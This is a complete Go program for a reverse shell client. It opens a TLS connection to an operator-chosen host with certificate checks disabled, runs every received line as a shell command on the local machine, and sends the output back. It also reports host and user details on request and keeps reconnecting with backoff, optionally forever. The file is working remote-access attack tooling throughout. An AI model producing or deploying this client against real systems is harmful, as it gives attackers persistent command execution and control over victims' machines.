package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// generateSelfSignedCert creates a self-signed TLS certificate on the fly
func generateSelfSignedCert() (tls.Certificate, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to generate private key: %v", err)
	}

	notBefore := time.Now()
	notAfter := notBefore.Add(365 * 24 * time.Hour)

	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			Organization:  []string{"Reverse Shell Listener"},
			CommonName:   "localhost",
		},
		NotBefore:             notBefore,
		NotAfter:              notAfter,
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to create certificate: %v", err)
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)})

	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to load certificate: %v", err)
	}

	return cert, nil
}

func executeCommand(command string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
	}
	return string(output)
}

func getSystemInfo() string {
	hostname, _ := os.Hostname()
	wd, _ := os.Getwd()
	
	info := fmt.Sprintf("=== System Information ===\n")
	info += fmt.Sprintf("OS: %s\n", runtime.GOOS)
	info += fmt.Sprintf("Arch: %s\n", runtime.GOARCH)
	info += fmt.Sprintf("Hostname: %s\n", hostname)
	info += fmt.Sprintf("Working Dir: %s\n", wd)
	info += fmt.Sprintf("User: %s\n", os.Getenv("USER"))
	if runtime.GOOS == "windows" {
		info += fmt.Sprintf("User: %s\n", os.Getenv("USERNAME"))
	}
	return info
}

func connectToListener(target string) {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}
	
	log.Printf("Connecting to listener at %s...", target)

	conn, err := tls.Dial("tcp", target, tlsConfig)
	if err != nil {
		log.Fatalf("Failed to connect to listener: %v", err)
	}
	defer conn.Close()

	log.Println("Connected to listener successfully")

	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)
	
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("Connection error: %v", err)
			break
		}

		command := strings.TrimSpace(line)

		if command == "" {
			continue
		}

		log.Printf("Received command: %s", command)

		var output string
		switch command {
		case "INFO":
			output = getSystemInfo()

		case "PING":
			// Send acknowledgment
			fmt.Fprintf(writer, "PONG\n")
			writer.Flush()
			continue

		case "exit":
			log.Println("Received exit command, disconnecting...")
			return

		default:
			output = executeCommand(command)
		}
		
		// Write output back to the connection
		fmt.Fprintf(writer, "%s\n", output)
		fmt.Fprintf(writer, "<<<END_OF_OUTPUT>>>\n")
		writer.Flush()
	}

	log.Println("Disconnected from listener")
}

func connectWithRetry(target string, maxRetries int) {
	retries := 0
	backoff := 5 * time.Second

	for {
		connectToListener(target)

		if maxRetries > 0 {
			retries++
			if retries >= maxRetries {
				log.Printf("Max retries (%d) reached. Exiting.", maxRetries)
				return
			}
		}

		log.Printf("Connection lost. Retrying in %v... (attempt %d)", backoff, retries+1)
		time.Sleep(backoff)

		backoff *= 2
		if backoff > 5*time.Minute {
			backoff = 5 * time.Minute
		}
	}
}

func runReverseClientMain() {
	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "Usage: %s <host:port|domain:port> <max-retries>\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s 192.168.1.100:8443 0\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s example.com:8443 5\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "\nmax-retries: 0 for infinite retries, or specify a number\n")
		os.Exit(1)
	}

	target := os.Args[1]
	maxRetries := 0
	fmt.Sscanf(os.Args[2], "%d", &maxRetries)

	log.Printf("Starting reverse shell client...")
	log.Printf("Target: %s", target)
	log.Printf("Max retries: %d (0 = infinite)", maxRetries)

	connectWithRetry(target, maxRetries)
}

func main() {
	runReverseClientMain()
}
